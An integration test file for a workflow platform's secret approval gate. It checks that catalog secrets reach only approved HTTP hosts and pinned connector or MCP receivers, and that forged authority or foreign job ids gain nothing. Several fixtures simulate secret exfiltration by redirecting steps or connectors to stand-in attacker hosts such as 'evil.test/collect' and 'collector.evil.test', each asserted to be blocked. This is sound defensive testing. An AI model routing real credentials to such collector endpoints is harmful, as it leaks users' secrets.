"""Workflow secrets on the worker path, on real PostgreSQL (ADR 0055, stage 2b).

Each run goes through the real submission (`enqueue_job`: pin + encrypted dispatch
record), the worker's request build and its authority restore, then the real HTTP
step with only the network replaced. A delivered message that carries forged
authority, a presented storage key or a job id it does not own gains nothing.
"""

from __future__ import annotations

import json
import logging
from types import SimpleNamespace
from uuid import uuid4

import pytest

from core.application.auth.secrets import encrypt_secret
from core.application.jobs.task_dispatch_common import _read_dispatch_envelope
from core.application.jobs.task_enqueue_runtime import enqueue_job
from core.application.jobs.task_execution_request import _build_request
from core.application.jobs.task_execution_service import TaskExecutionService
from core.application.management.errors import ServiceForbiddenError, ServiceValidationError
from core.application.orchestration import http_request_step_runtime as runtime
from core.application.registry.db_store import RegistryDBStore
from core.application.registry.workflow_secret_defaults import secret_default_ref_owner_prefix
from core.application.secrets.approval_gate import SecretConfigurationUnapproved
from core.application.secrets.service import SecretCatalogService
from core.infrastructure.db.worker.job_execution_repository import JobExecutionRepositoryAdapter
from core.infrastructure.security.secret_reference import SecretReference
from core.infrastructure.security.stored_secrets import LocalStoredSecretReader
from tests.integration.test_secret_catalog_postgres import (
    ACCOUNT,
    _connect,
    _human,
    _project,
    _token,
    create_database,  # noqa: F401 - the shared disposable-database fixture
)
from tests.support.platform_test_store import PlatformTestStore

pytestmark = pytest.mark.integration

URL = "https://api.partner.test/v1/send"
#: A delegated key an unapproved level never passed on is not authorized at all;
#: a key the job holds under an unapproved pin is refused by the catalog gate.
_DENIED = {"unresolved_secret_input", "secret_configuration_unapproved"}
VALUE = "synthetic-catalog-value"


def _http_step(url: str = URL, header: str = "X-Api-Key") -> dict:
    return {
        "step_id": "send",
        "step_kind": "http_request",
        "display_name": "Send",
        "override": {
            "http_request": {
                "method": "POST",
                "url": url,
                "headers": {header: "{{ state.inputs.api_key }}"},
                "auth_mode": "none",
                "expected_statuses": [200],
                "response_target": "state.outputs.echo",
            }
        },
    }


def _settings(default_ref: str = "") -> dict:
    row = {"name": "api_key", "type": "secret", "required": True}
    if default_ref:
        row["default_secret_ref"] = default_ref
    return {
        "callable": {
            "enabled": True,
            "trigger_channels": ["ui", "api"],
            "input_mode": "fields",
            "expected_inputs": [row],
        },
        "execution_graph": {
            "schema_version": 1,
            "entry": {"kind": "step", "id": "send"},
            "edges": [
                {
                    "source": {"kind": "step", "id": "send"},
                    "outcome": {"name": "success"},
                    "target": {"kind": "step", "id": "done"},
                }
            ],
        },
    }


class Stand(SimpleNamespace):
    """One disposable database with a project, a store and the network replaced."""

    def save(self, workflow_id: str, *, step: dict | None = None, default_ref: str = "") -> None:
        self.registry.save_workflow(
            {
                "workflow_id": workflow_id,
                "display_name": workflow_id,
                "enabled": True,
                "settings": _settings(default_ref),
                "steps": [step or _http_step(), {"step_id": "done", "step_kind": "stop_success"}],
                "groups": [],
                "for_each": [],
            }
        )
        self.store.add_project_workflow_binding(self.project_id, workflow_id)

    def enqueue(
        self,
        workflow_id: str,
        inputs: dict,
        *,
        task_source: str = "manual_ui",
        meta: dict | None = None,
        forged: dict | None = None,
    ) -> str:
        extra_state = {"workflow_id": workflow_id, "inputs": inputs, **(forged or {})}
        job_id = enqueue_job(
            bl=self.store,
            enqueue_task_fn=lambda **_kwargs: None,
            build_project_config_snapshot=lambda config: dict(config),
            logger=logging.getLogger(__name__),
            log_prefix="worker-path-test",
            notification_dispatch_fn=None,
            task_id="task-" + uuid4().hex[:8],
            task_summary="Send",
            task_source=task_source,
            test_mode=False,
            project_id=self.project_id,
            project_name="Secrets",
            project_config={},
            extra_state=extra_state,
            meta=dict(meta or {}),
        )
        return str(job_id)

    def deliver(self, job_id: str, *, message_extra: dict | None = None) -> dict:
        """The worker side: the delivered message, the request build, the restore."""
        envelope = _read_dispatch_envelope(self.store, job_id)
        message = {
            "job_id": job_id,
            "task_id": "t",
            "task_source": "manual_ui",
            "project_config": envelope["project_config"],
            # A forged message cannot add authority: the worker never reads it.
            "extra_state": {**envelope["extra_state"], **(message_extra or {})},
        }
        repository = JobExecutionRepositoryAdapter(SimpleNamespace(conn=self.conn), None)
        service = TaskExecutionService(
            repository=repository,
            graph=None,
            terminal=None,
            runtime_mode=None,
            worker_id=lambda: "w",
        )
        request = _build_request(message, self.store.get_job(job_id))
        service._restore_secret_authority(request)
        return {
            **request.extra_state,
            "job_id": job_id,
            "runtime_context": {"account_id": ACCOUNT},
        }

    def run_http(self, state: dict, job_id: str) -> dict:
        """The pinned HTTP step of the job, executed with the network captured."""
        cur = self.conn.cursor()
        cur.execute(
            "SELECT s.definition_jsonb FROM jobs j "
            "JOIN workflow_definition_snapshots s ON s.id = j.workflow_definition_snapshot_id "
            "WHERE j.id::text = %s",
            (job_id,),
        )
        definition = cur.fetchone()[0]
        step = next(s for s in definition["steps"] if s["step_kind"] == "http_request")
        self.sent.clear()
        return runtime.execute_http_request_step(
            config=step["override"]["http_request"],
            state=state,
            secret_reader=LocalStoredSecretReader(self.conn),
        )


@pytest.fixture
def stand(create_database, monkeypatch):  # noqa: F811
    dsn = create_database()
    conn = _connect(dsn)
    with conn.cursor() as cur:
        project_id = _project(cur, "worker-path")
    sent: list[dict] = []

    class Response:
        status_code = 200

        @property
        def headers(self) -> dict[str, str]:
            return {"content-type": "application/json"}

        def __enter__(self):
            return self

        def __exit__(self, *_args):
            return False

        def iter_raw(self, chunk_size=None):
            yield b'{"ok":true}'

    class Client:
        def __init__(self, **_kwargs):
            pass

        def __enter__(self):
            return self

        def __exit__(self, *_args):
            return False

        def stream(self, **kwargs):
            sent.append(kwargs)
            return Response()

    monkeypatch.setattr(runtime.httpx, "Client", Client)
    monkeypatch.setattr(runtime, "_SSRFGuardedHTTPTransport", lambda: object())
    monkeypatch.setattr(runtime, "_validate_http_request_url", lambda url: url)
    monkeypatch.setattr(runtime, "_get_shared_logger", lambda: SimpleNamespace(conn=conn))
    monkeypatch.setattr(
        "core.application.registry.registry_manager.RegistryManager.instance",
        lambda: SimpleNamespace(db_store=RegistryDBStore(dsn)),
    )
    service = SecretCatalogService(lambda: conn, encrypt=encrypt_secret)
    yield Stand(
        conn=conn,
        project_id=project_id,
        registry=RegistryDBStore(dsn),
        store=PlatformTestStore(dsn),
        service=service,
        sent=sent,
    )
    conn.close()


def _catalog_input(stand: Stand, workflow_id: str) -> tuple[dict, str]:
    """A bound, approved catalog secret; returns the secret and its storage key."""
    secret = stand.service.create_secret(
        _human(), name="Partner key", value=VALUE, project_id=stand.project_id
    )
    status = stand.service.bind_workflow_input(
        workflow_id, _human(), project_id=stand.project_id, field="api_key", secret_id=secret["id"]
    )
    stand.service.approve_workflow(
        workflow_id, _human(), project_id=stand.project_id, fingerprint=status["fingerprint"]
    )
    return secret, f"catalog_secret:{secret['id']}"


def _ref(key: str) -> dict:
    return SecretReference(name="api_key", ref_key=key).to_wire()


def _sent_header(stand: Stand, header: str = "X-Api-Key") -> str | None:
    if not stand.sent:
        return None
    return dict(stand.sent[-1].get("headers") or {}).get(header)


def test_a_bound_catalog_secret_reaches_its_approved_destination(stand) -> None:
    stand.save("wf_catalog")
    _secret, key = _catalog_input(stand, "wf_catalog")
    status = stand.service.workflow_approval_status(
        "wf_catalog", _human(), project_id=stand.project_id
    )
    # The status reads the steps, so the approval shows where the secret goes.
    assert status["destinations"] == [
        {"kind": "exact_host", "scheme": "https", "host": "api.partner.test", "port": 443}
    ]
    job_id = stand.enqueue("wf_catalog", {"api_key": _ref(key)})

    result = stand.run_http(stand.deliver(job_id), job_id)

    assert result["ok"] is True, result
    assert _sent_header(stand) == VALUE
    assert VALUE not in json.dumps(result)


def test_inline_and_workflow_default_secrets_work_on_the_worker_path(stand) -> None:
    default_key = secret_default_ref_owner_prefix("wf_default", "api_key") + "a" * 24
    with stand.conn.cursor() as cur:
        cur.execute(
            "INSERT INTO secret_refs (account_id, ref_key, encrypted_value) VALUES (%s, %s, %s)",
            (ACCOUNT, default_key, encrypt_secret("synthetic-default")),
        )
    stand.save("wf_default", default_ref=default_key)
    job_id = stand.enqueue("wf_default", {"api_key": _ref(default_key)})
    assert stand.run_http(stand.deliver(job_id), job_id)["ok"] is True
    assert _sent_header(stand) == "synthetic-default"

    stand.save("wf_inline")
    inline = SecretReference(name="api_key", ciphertext=encrypt_secret("synthetic-inline"))
    job_id = stand.enqueue("wf_inline", {"api_key": inline.to_wire()})
    assert stand.run_http(stand.deliver(job_id), job_id)["ok"] is True
    assert _sent_header(stand) == "synthetic-inline"


def test_an_edit_after_enqueue_changes_neither_the_run_nor_its_grant(stand) -> None:
    stand.save("wf_pinned")
    _secret, key = _catalog_input(stand, "wf_pinned")
    job_id = stand.enqueue("wf_pinned", {"api_key": _ref(key)})
    # The definition moves on after the job pinned the approved one.
    stand.save("wf_pinned", step=_http_step(url="https://evil.test/collect"))

    result = stand.run_http(stand.deliver(job_id), job_id)
    assert result["ok"] is True, result
    assert stand.sent[-1]["url"] == URL

    # A new run pins the edited, unapproved definition and reads nothing.
    edited_job = stand.enqueue("wf_pinned", {"api_key": _ref(key)})
    result = stand.run_http(stand.deliver(edited_job), edited_job)
    assert result["ok"] is False
    assert result["failure_reason"] == "secret_configuration_unapproved"
    assert stand.sent == []


def test_a_same_host_step_edit_needs_a_new_approval(stand) -> None:
    stand.save("wf_header")
    _secret, key = _catalog_input(stand, "wf_header")
    stand.save("wf_header", step=_http_step(header="X-Forward-To-Log"))

    job_id = stand.enqueue("wf_header", {"api_key": _ref(key)})
    result = stand.run_http(stand.deliver(job_id), job_id)
    assert result["failure_reason"] == "secret_configuration_unapproved"
    assert stand.sent == []

    status = stand.service.workflow_approval_status(
        "wf_header", _human(), project_id=stand.project_id
    )
    assert status["status"] == "approval_required"
    stand.service.approve_workflow(
        "wf_header", _human(), project_id=stand.project_id, fingerprint=status["fingerprint"]
    )
    job_id = stand.enqueue("wf_header", {"api_key": _ref(key)})
    assert stand.run_http(stand.deliver(job_id), job_id)["ok"] is True
    assert _sent_header(stand, "X-Forward-To-Log") == VALUE


def test_forged_keys_messages_and_job_ids_grant_nothing(stand) -> None:
    stand.save("wf_owner")
    _secret, key = _catalog_input(stand, "wf_owner")
    owner_job = stand.enqueue("wf_owner", {"api_key": _ref(key)})

    # Another workflow presents the storage key and forges authority everywhere it can.
    stand.save("wf_thief")
    status = stand.service.workflow_approval_status(
        "wf_thief", _human(), project_id=stand.project_id
    )
    stand.service.approve_workflow(
        "wf_thief", _human(), project_id=stand.project_id, fingerprint=status["fingerprint"]
    )
    forged = {
        "_workflow_secret_ref_fingerprints": ["forged"],
        "_workflow_catalog_secret_authority": {"x": {"rules": []}},
        "job_id": owner_job,
    }
    thief_job = stand.enqueue("wf_thief", {"api_key": _ref(key)}, forged=forged)
    state = stand.deliver(thief_job, message_extra=forged)
    assert "forged" not in state["_workflow_secret_ref_fingerprints"]
    result = stand.run_http(state, thief_job)
    assert result["ok"] is False
    assert stand.sent == []

    # A job id that names no job, or another account's job, reads nothing either.
    for job_id in (str(uuid4()), ""):
        result = stand.run_http({**state, "job_id": job_id}, thief_job)
        assert result["ok"] is False
        assert stand.sent == []


def test_a_child_reads_a_parent_secret_only_through_a_confirmed_link(stand) -> None:
    stand.save("wf_parent")
    _secret, key = _catalog_input(stand, "wf_parent")
    parent_job = stand.enqueue("wf_parent", {"api_key": _ref(key)})
    stand.save("wf_child")
    status = stand.service.workflow_approval_status(
        "wf_child", _human(), project_id=stand.project_id
    )
    stand.service.approve_workflow(
        "wf_child", _human(), project_id=stand.project_id, fingerprint=status["fingerprint"]
    )
    link = {
        "invoke_parent_job_id": parent_job,
        "invoke_parent_task_id": "t",
        "invoke_parent_workflow_id": "wf_parent",
        "invoke_child_workflow_id": "wf_child",
    }
    child_job = stand.enqueue(
        "wf_child", {"api_key": _ref(key)}, task_source="invoke_workflow", meta=link
    )
    # Without the parent's own record of this child, the link is not confirmed.
    result = stand.run_http(stand.deliver(child_job), child_job)
    assert result["ok"] is False
    assert stand.sent == []

    with stand.conn.cursor() as cur:
        cur.execute(
            "UPDATE jobs SET meta = jsonb_set(COALESCE(meta, '{}'::jsonb), '{invoke_children}', "
            "jsonb_build_object(%s::text, jsonb_build_object('step_id', 'call'))) "
            "WHERE id::text = %s",
            (child_job, parent_job),
        )
    result = stand.run_http(stand.deliver(child_job), child_job)
    assert result["ok"] is True, result
    assert _sent_header(stand) == VALUE

    # The child's own definition must stay approved.
    stand.save("wf_child", step=_http_step(header="X-Other"))
    edited = stand.enqueue(
        "wf_child", {"api_key": _ref(key)}, task_source="invoke_workflow", meta=link
    )
    with stand.conn.cursor() as cur:
        cur.execute(
            "UPDATE jobs SET meta = jsonb_set(meta, '{invoke_children}', "
            "meta->'invoke_children' || jsonb_build_object(%s::text, '{}'::jsonb)) "
            "WHERE id::text = %s",
            (edited, parent_job),
        )
    result = stand.run_http(stand.deliver(edited), edited)
    assert result["failure_reason"] == "secret_configuration_unapproved"
    assert stand.sent == []


def test_redelivery_and_retry_of_one_job_are_checked_again_against_its_pin(stand) -> None:
    stand.save("wf_retry")
    secret, key = _catalog_input(stand, "wf_retry")
    job_id = stand.enqueue("wf_retry", {"api_key": _ref(key)})

    first = stand.deliver(job_id)
    again = stand.deliver(job_id)
    assert first["_workflow_secret_ref_fingerprints"] == again["_workflow_secret_ref_fingerprints"]
    assert stand.run_http(again, job_id)["ok"] is True

    # A resumed run keeps its checkpointed capabilities, and the gate still asks the
    # database: once the binding is gone, the same job reads nothing.
    stand.service.unbind_workflow_input(
        "wf_retry", _human(), project_id=stand.project_id, field="api_key"
    )
    result = stand.run_http(first, job_id)
    assert result["ok"] is False
    assert stand.sent == []
    assert secret["id"]


def test_a_computed_path_keeps_its_origin_and_a_computed_host_needs_rules(stand) -> None:
    stand.save("wf_path", step=_http_step(url="https://api.partner.test/{{ state.inputs.target }}"))
    secret = stand.service.create_secret(
        _human(), name="Path key", value=VALUE, project_id=stand.project_id
    )
    status = stand.service.bind_workflow_input(
        "wf_path", _human(), project_id=stand.project_id, field="api_key", secret_id=secret["id"]
    )
    assert status["dynamic_http_steps"] == []
    assert status["destinations"] == [
        {"kind": "exact_host", "scheme": "https", "host": "api.partner.test", "port": 443}
    ]
    stand.service.approve_workflow(
        "wf_path", _human(), project_id=stand.project_id, fingerprint=status["fingerprint"]
    )
    key = f"catalog_secret:{secret['id']}"
    for target, allowed in (("v1/x", True), ("../../other", True)):
        job_id = stand.enqueue("wf_path", {"api_key": _ref(key), "target": target})
        result = stand.run_http(stand.deliver(job_id), job_id)
        assert result["ok"] is allowed, (target, result)
        assert stand.sent[-1]["url"].startswith("https://api.partner.test/")

    stand.save("wf_host", step=_http_step(url="https://{{ state.inputs.host }}/v1"))
    status = stand.service.bind_workflow_input(
        "wf_host", _human(), project_id=stand.project_id, field="api_key", secret_id=secret["id"]
    )
    assert status["dynamic_http_steps"] == ["send"]
    with pytest.raises(ServiceValidationError, match="computed URL"):
        stand.service.approve_workflow(
            "wf_host", _human(), project_id=stand.project_id, fingerprint=status["fingerprint"]
        )
    with pytest.raises(ServiceValidationError, match="not supported"):
        stand.service.approve_workflow(
            "wf_host",
            _human(),
            project_id=stand.project_id,
            fingerprint=status["fingerprint"],
            destinations=[{"kind": "subdomains", "scheme": "https", "host": "partner.test"}],
        )
    stand.service.approve_workflow(
        "wf_host",
        _human(),
        project_id=stand.project_id,
        fingerprint=status["fingerprint"],
        destinations=[{"scheme": "https", "host": "api.partner.test", "path_prefix": "/v1"}],
    )
    # The HTTP step refuses a secret-bearing request with a computed host before
    # any read, whatever was approved.
    job_id = stand.enqueue("wf_host", {"api_key": _ref(key), "host": "api.partner.test"})
    result = stand.run_http(stand.deliver(job_id), job_id)
    assert result["ok"] is False
    assert stand.sent == []


def test_binding_and_approval_need_their_own_authority(stand) -> None:
    stand.save("wf_scopes")
    secret = stand.service.create_secret(
        _human(), name="Scoped key", value=VALUE, project_id=stand.project_id
    )
    with pytest.raises(ServiceForbiddenError):
        stand.service.bind_workflow_input(
            "wf_scopes",
            _token("admin:all", "*:*", "secrets:*", "*:bind"),
            project_id=stand.project_id,
            field="api_key",
            secret_id=secret["id"],
        )
    with pytest.raises(ServiceValidationError, match="not a secret input"):
        stand.service.bind_workflow_input(
            "wf_scopes",
            _human(),
            project_id=stand.project_id,
            field="other",
            secret_id=secret["id"],
        )
    status = stand.service.bind_workflow_input(
        "wf_scopes", _human(), project_id=stand.project_id, field="api_key", secret_id=secret["id"]
    )
    with pytest.raises(ServiceForbiddenError):
        stand.service.approve_workflow(
            "wf_scopes",
            _token("secrets:bind", "secrets:write"),
            project_id=stand.project_id,
            fingerprint=status["fingerprint"],
        )


def _approve(stand: Stand, workflow_id: str) -> None:
    status = stand.service.workflow_approval_status(
        workflow_id, _human(), project_id=stand.project_id
    )
    stand.service.approve_workflow(
        workflow_id, _human(), project_id=stand.project_id, fingerprint=status["fingerprint"]
    )


def _child(stand: Stand, parent_job: str, parent_wf: str, child_wf: str, key: str) -> str:
    """A child job of `parent_job` whose link both sides record."""
    child_job = stand.enqueue(
        child_wf,
        {"api_key": _ref(key)},
        task_source="invoke_workflow",
        meta={
            "invoke_parent_job_id": parent_job,
            "invoke_parent_task_id": "t",
            "invoke_parent_workflow_id": parent_wf,
            "invoke_child_workflow_id": child_wf,
        },
    )
    with stand.conn.cursor() as cur:
        cur.execute(
            "UPDATE jobs SET meta = jsonb_set(COALESCE(meta, '{}'::jsonb), '{invoke_children}', "
            "COALESCE(meta->'invoke_children', '{}'::jsonb) "
            "|| jsonb_build_object(%s::text, '{}'::jsonb)) WHERE id::text = %s",
            (child_job, parent_job),
        )
    return child_job


def test_an_approved_child_never_revives_an_unapproved_parent(stand) -> None:
    stand.save("wf_a")
    _secret, key = _catalog_input(stand, "wf_a")
    # A changes after its approval and before its run: its pin is not approved.
    stand.save("wf_a", step=_http_step(header="X-Changed"))
    parent_job = stand.enqueue("wf_a", {"api_key": _ref(key)})
    stand.save("wf_b")
    _approve(stand, "wf_b")

    child_job = _child(stand, parent_job, "wf_a", "wf_b", key)
    result = stand.run_http(stand.deliver(child_job), child_job)
    assert result["failure_reason"] in _DENIED, result
    assert stand.sent == []


def test_every_level_of_an_invoke_chain_must_be_approved(stand) -> None:
    stand.save("wf_top")
    _secret, key = _catalog_input(stand, "wf_top")
    top_job = stand.enqueue("wf_top", {"api_key": _ref(key)})
    stand.save("wf_middle")  # never approved
    stand.save("wf_leaf")
    _approve(stand, "wf_leaf")

    middle_job = _child(stand, top_job, "wf_top", "wf_middle", key)
    leaf_job = _child(stand, middle_job, "wf_middle", "wf_leaf", key)
    result = stand.run_http(stand.deliver(leaf_job), leaf_job)
    assert result["failure_reason"] in _DENIED, result
    assert stand.sent == []

    # Approving the middle level completes the chain.
    _approve(stand, "wf_middle")
    result = stand.run_http(stand.deliver(leaf_job), leaf_job)
    assert result["ok"] is True, result
    assert _sent_header(stand) == VALUE


class _SpyReader:
    """The real reader, counting reads, so a refusal is shown to happen before any."""

    def __init__(self, conn) -> None:
        self.inner = LocalStoredSecretReader(conn)
        self.reads: list[str] = []

    def read(self, context, ref_key: str) -> str:
        self.reads.append(ref_key)
        return self.inner.read(context, ref_key)


def test_an_unpinned_connector_input_never_receives_a_catalog_secret(stand, monkeypatch) -> None:
    from core.application.orchestration import connector_step_runtime
    from core.application.secrets.workflow_gate import CatalogSecretReceiverUnpinned

    monkeypatch.setattr(
        connector_step_runtime, "_shared_logger", lambda: SimpleNamespace(conn=stand.conn)
    )
    stand.save("wf_connector")
    _secret, key = _catalog_input(stand, "wf_connector")
    job_id = stand.enqueue("wf_connector", {"api_key": _ref(key)})
    state = stand.deliver(job_id)
    spy = _SpyReader(stand.conn)

    # A connector input with no pinned receiver (a tool or MCP server, or no
    # extension captured) is not read for a catalog secret.
    with pytest.raises(CatalogSecretReceiverUnpinned):
        connector_step_runtime._payload_for_dispatch({"token": _ref(key)}, state, spy)
    assert spy.reads == []

    # A workflow-local secret still reaches a connector input, as before.
    default_key = secret_default_ref_owner_prefix("wf_local", "api_key") + "b" * 24
    with stand.conn.cursor() as cur:
        cur.execute(
            "INSERT INTO secret_refs (account_id, ref_key, encrypted_value) VALUES (%s, %s, %s)",
            (ACCOUNT, default_key, encrypt_secret("synthetic-local")),
        )
    stand.save("wf_local", default_ref=default_key)
    local_job = stand.enqueue("wf_local", {"api_key": _ref(default_key)})
    payload, _protected, _over = connector_step_runtime._payload_for_dispatch(
        {"token": _ref(default_key)}, stand.deliver(local_job), spy
    )
    assert payload == {"token": "synthetic-local"}


def test_an_http_read_without_a_validated_url_is_refused(stand) -> None:
    from core.application.secrets.workflow_gate import (
        RECEIVER_HTTP,
        SecretDestinationNotAllowed,
        require_catalog_ref_authority,
    )

    stand.save("wf_nourl")
    _secret, key = _catalog_input(stand, "wf_nourl")
    job_id = stand.enqueue("wf_nourl", {"api_key": _ref(key)})
    state = stand.deliver(job_id)
    require_catalog_ref_authority(stand.conn, state, ref_key=key, receiver=RECEIVER_HTTP, url=URL)
    with pytest.raises(SecretDestinationNotAllowed):
        require_catalog_ref_authority(stand.conn, state, ref_key=key, receiver=RECEIVER_HTTP)


_CONNECTOR_STEP = {
    "step_id": "call",
    "step_kind": "connector",
    "connector_id": "extension.partner.send",
    "connector_install_id": "pi_partner",
    "display_name": "Call",
    "override": {
        "connector": {
            "extension_id": "partner",
            "action_id": "send",
            "input_mapping": {"token": "{{ state.inputs.api_key }}"},
        }
    },
}


def test_an_extension_release_update_does_not_inherit_the_approval(stand, monkeypatch) -> None:
    """Approved workflow, catalog secret in an extension input, same install updated."""
    from core.application.orchestration import connector_receiver, connector_step_runtime

    monkeypatch.setattr(
        connector_step_runtime, "_shared_logger", lambda: SimpleNamespace(conn=stand.conn)
    )
    current = {"release_id": "rel_1", "digest": "sha256:aaaa"}

    def pin(**target):
        return connector_receiver.PinnedReceiver(
            install_id=target["connector_install_id"],
            release_id=current["release_id"],
            descriptor_sha256=current["digest"],
            extension_id="partner",
            runtime_extension={"bundle_root": "/host-only/path"},
        )

    monkeypatch.setattr(connector_receiver, "pin_extension_receiver", pin)
    with stand.conn.cursor() as cur:
        cur.execute(
            "INSERT INTO extension_releases (release_id, extension_id, release_version) "
            "VALUES ('rel_1', 'partner', '1.0.0')"
        )
        cur.execute(
            "INSERT INTO extension_installs (extension_id, account_id, install_id, release_id) "
            "VALUES ('partner', %s, 'pi_partner', 'rel_1')",
            (ACCOUNT,),
        )
    stand.save("wf_ext", step=_CONNECTOR_STEP)
    secret, key = _catalog_input(stand, "wf_ext")
    status = stand.service.workflow_approval_status("wf_ext", _human(), project_id=stand.project_id)
    assert status["status"] == "approved"
    assert status["receivers"] == [
        {
            "project_id": str(stand.project_id),
            "step_id": "call",
            "kind": "extension",
            "install_id": "pi_partner",
            "release_id": "rel_1",
            "descriptor_sha256": "sha256:aaaa",
        }
    ]
    # The approval names the release, never a host path.
    assert "host-only" not in json.dumps(status)
    # A step test run pins the draft without structural validation; this connector
    # step names an extension that is not installed on disk here.
    job_id = stand.enqueue("wf_ext", {"api_key": _ref(key)}, task_source="step_test_run")
    state = stand.deliver(job_id)
    spy = _SpyReader(stand.conn)
    approved = pin(connector_install_id="pi_partner").identity()
    payload, _protected, _over = connector_step_runtime._payload_for_dispatch(
        {"token": _ref(key)}, state, spy, approved
    )
    assert payload == {"token": VALUE}

    # The same install now runs another release; the workflow did not change.
    current.update(release_id="rel_2", digest="sha256:bbbb")
    status = stand.service.workflow_approval_status("wf_ext", _human(), project_id=stand.project_id)
    assert status["status"] == "approval_required"
    spy.reads.clear()
    # The new release does not inherit the approval.
    with pytest.raises(SecretConfigurationUnapproved):
        connector_step_runtime._payload_for_dispatch(
            {"token": _ref(key)}, state, spy, pin(connector_install_id="pi_partner").identity()
        )
    assert spy.reads == []
    # A step that captured the old release before the update dispatches to that
    # captured, approved code, so its read is still the approved one.
    payload, _protected, _over = connector_step_runtime._payload_for_dispatch(
        {"token": _ref(key)}, state, spy, approved
    )
    assert payload == {"token": VALUE}

    stand.service.approve_workflow(
        "wf_ext", _human(), project_id=stand.project_id, fingerprint=status["fingerprint"]
    )
    payload, _protected, _over = connector_step_runtime._payload_for_dispatch(
        {"token": _ref(key)}, state, spy, pin(connector_install_id="pi_partner").identity()
    )
    assert payload == {"token": VALUE}
    assert secret["id"]


_MCP_STEP = {
    "step_id": "ask",
    "step_kind": "connector",
    "connector_id": "tool.partner_mcp",
    "display_name": "Ask",
    "override": {"connector": {"input_mapping": {"token": "{{ state.inputs.api_key }}"}}},
}


def test_an_mcp_receiver_is_approved_per_project_and_by_its_config(stand, monkeypatch) -> None:
    """A remote MCP tool: the connector row selected before the read, for the job's project."""
    from core.application.orchestration import connector_receiver, connector_step_runtime

    monkeypatch.setattr(
        connector_step_runtime, "_shared_logger", lambda: SimpleNamespace(conn=stand.conn)
    )
    manifest = SimpleNamespace(
        implementation=SimpleNamespace(
            to_dict=lambda: {
                "type": "mcp",
                "connector_id": "mcp_partner",
                "remote_tool_name": "ask",
            }
        )
    )
    row = {
        "connector_id": "mcp_partner",
        "account_id": ACCOUNT,
        "project_id": str(stand.project_id),
        "transport": "streamable_http",
        "base_url": "https://mcp.partner.test/mcp",
        "auth_mode": "headers",
        "header_secret_refs_jsonb": {"refs": {"X-Key": "gen-1"}},
        "allowlisted_tools": ["ask"],
        "enabled": True,
    }

    def pin_tool(**_kwargs):
        return connector_receiver.PinnedTool(
            tool_id="partner_mcp", manifest=manifest, mcp_row=dict(row)
        )

    monkeypatch.setattr(connector_receiver, "pin_tool_receiver", pin_tool)
    stand.save("wf_mcp", step=_MCP_STEP)
    _secret, key = _catalog_input(stand, "wf_mcp")
    status = stand.service.workflow_approval_status("wf_mcp", _human(), project_id=stand.project_id)
    assert status["status"] == "approved"
    [receiver] = status["receivers"]
    assert (receiver["kind"], receiver["project_id"]) == ("mcp", str(stand.project_id))
    # A person approves a named endpoint, transport and tool, not a bare digest.
    assert (receiver["endpoint"], receiver["transport"], receiver["remote_tool"]) == (
        "https://mcp.partner.test/mcp",
        "streamable_http",
        "ask",
    )

    job_id = stand.enqueue("wf_mcp", {"api_key": _ref(key)}, task_source="step_test_run")
    state = stand.deliver(job_id)
    spy = _SpyReader(stand.conn)
    payload, _p, _o = connector_step_runtime._payload_for_dispatch(
        {"token": _ref(key)}, state, spy, pin_tool().identity()
    )
    assert payload == {"token": VALUE}

    # A new header value writes a new reference generation; another endpoint is
    # another receiver. Either needs a new approval before a read.
    for change in (
        {"header_secret_refs_jsonb": {"refs": {"X-Key": "gen-2"}}},
        {"base_url": "https://collector.evil.test/mcp"},
    ):
        row.update(change)
        spy.reads.clear()
        with pytest.raises(SecretConfigurationUnapproved):
            connector_step_runtime._payload_for_dispatch(
                {"token": _ref(key)}, state, spy, pin_tool().identity()
            )
        assert spy.reads == []
        status = stand.service.workflow_approval_status(
            "wf_mcp", _human(), project_id=stand.project_id
        )
        assert status["status"] == "approval_required"


def test_a_host_tool_edit_under_the_same_id_needs_a_new_approval(stand, monkeypatch) -> None:
    from core.application.orchestration import connector_receiver, connector_step_runtime

    monkeypatch.setattr(
        connector_step_runtime, "_shared_logger", lambda: SimpleNamespace(conn=stand.conn)
    )
    current = {"config": {"region": "eu"}}

    def manifest():
        return SimpleNamespace(
            implementation=SimpleNamespace(
                to_dict=lambda: {"type": "python", "module": "core.tools.partner"}
            ),
            config=dict(current["config"]),
            interface=SimpleNamespace(function_name="send", operations=[]),
        )

    def pin_tool(**_kwargs):
        return connector_receiver.PinnedTool(tool_id="partner_send", manifest=manifest())

    monkeypatch.setattr(connector_receiver, "pin_tool_receiver", pin_tool)
    stand.save("wf_tool", step={**_MCP_STEP, "connector_id": "tool.partner_send"})
    _secret, key = _catalog_input(stand, "wf_tool")
    job_id = stand.enqueue("wf_tool", {"api_key": _ref(key)}, task_source="step_test_run")
    state = stand.deliver(job_id)
    spy = _SpyReader(stand.conn)
    payload, _p, _o = connector_step_runtime._payload_for_dispatch(
        {"token": _ref(key)}, state, spy, pin_tool().identity()
    )
    assert payload == {"token": VALUE}

    # A machine edit of the same tool id changes what runs: refused before the read.
    current["config"] = {"region": "eu", "forward_to": "https://collector.evil.test"}
    spy.reads.clear()
    with pytest.raises(SecretConfigurationUnapproved):
        connector_step_runtime._payload_for_dispatch(
            {"token": _ref(key)}, state, spy, pin_tool().identity()
        )
    assert spy.reads == []
